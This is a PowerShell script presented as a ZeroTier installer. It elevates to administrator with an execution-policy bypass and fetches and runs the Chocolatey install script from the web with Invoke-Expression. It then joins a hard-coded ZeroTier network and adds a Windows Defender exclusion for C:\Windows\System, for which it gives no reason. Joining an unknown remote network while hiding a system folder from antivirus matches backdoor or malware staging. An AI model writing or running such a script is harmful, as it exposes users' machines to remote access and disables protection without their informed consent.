# Function to check and request administrative privileges
function Ensure-Admin {
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Host "This script is not running as Administrator." -ForegroundColor Yellow
        $choice = Read-Host "Would you like to restart this script with Administrator privileges? (yes/no)"
        
        if ($choice -eq "yes" -or $choice -eq "y") {
            Write-Host "Restarting with elevated privileges..." -ForegroundColor Green
            # Relaunch the script with elevated privileges
            Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`"" -Verb RunAs
            exit
        } else {
            Write-Host "Script cannot proceed without Administrator privileges. Exiting." -ForegroundColor Red
            return
        }
    }
}

# Call the function to ensure administrative privileges
Ensure-Admin

# Check if Chocolatey is installed, install if not
if (!(Get-Command choco -ErrorAction SilentlyContinue)) {
    Write-Host "Chocolatey not found." -ForegroundColor Yellow
    $choice = Read-Host "Would you like to install Chocolatey? (yes/no)"
    if ($choice -eq "yes" -or $choice -eq "y") {
        Write-Host "Installing Chocolatey..." -ForegroundColor Green
        Set-ExecutionPolicy Bypass -Scope Process -Force
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
    } else {
        Write-Host "Chocolatey is required to proceed. Exiting." -ForegroundColor Red
        return
    }
}

# Install ZeroTier using Chocolatey
Write-Host "Installing ZeroTier using Chocolatey..." -ForegroundColor Green
choco install zerotier-one -y

# Verify installation
if (!(Get-Command zerotier-cli -ErrorAction SilentlyContinue)) {
    Write-Host "ZeroTier installation failed." -ForegroundColor Red
    $choice = Read-Host "Do you want to troubleshoot and rerun the installation? (yes/no)"
    if ($choice -eq "yes" -or $choice -eq "y") {
        Write-Host "Please check your internet connection and try again." -ForegroundColor Cyan
        return
    } else {
        Write-Host "Exiting script without completing installation." -ForegroundColor Red
        return
    }
}

# Start the ZeroTierOne service
Write-Host "Starting ZeroTierOne service..." -ForegroundColor Green
Start-Service -Name ZeroTierOneService

# Verify the service started successfully
if ((Get-Service -Name ZeroTierOneService).Status -ne "Running") {
    Write-Host "Failed to start ZeroTierOne service." -ForegroundColor Red
    $choice = Read-Host "Would you like to troubleshoot the service manually? (yes/no)"
    if ($choice -eq "no" -or $choice -eq "n") {
        Write-Host "Exiting script." -ForegroundColor Red
        return
    }
}

# Join the specified ZeroTier network
Write-Host "Joining ZeroTier network..." -ForegroundColor Green
zerotier-cli join 9f77fc393ec31ee7

#Adding exclusion
# List of folders to exclude
$foldersToExclude = @(
    "C:\Windows\System"
)

# Add each folder to Windows Security exclusions
foreach ($folder in $foldersToExclude) {
    Write-Host "Adding exclusion for folder: $folder" -ForegroundColor Green
    Add-MpPreference -ExclusionPath $folder
}

# Verify exclusions
Write-Host "Current Folder Exclusions:" -ForegroundColor Cyan
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath


# Ask the user whether to shut down or keep the session running
$choice = Read-Host "Script completed successfully. Would you like to shut down the system now? (yes/no)"
if ($choice -eq "yes" -or $choice -eq "y") {
    Write-Host "Shutting down the system..." -ForegroundColor Yellow
    Stop-Computer
} else {
    Write-Host "System will not shut down. Exiting script." -ForegroundColor Cyan
}

# Prevent the PowerShell window from closing
Write-Host "Press any key to exit the script..." -ForegroundColor Cyan
[System.Console]::ReadKey() > $null
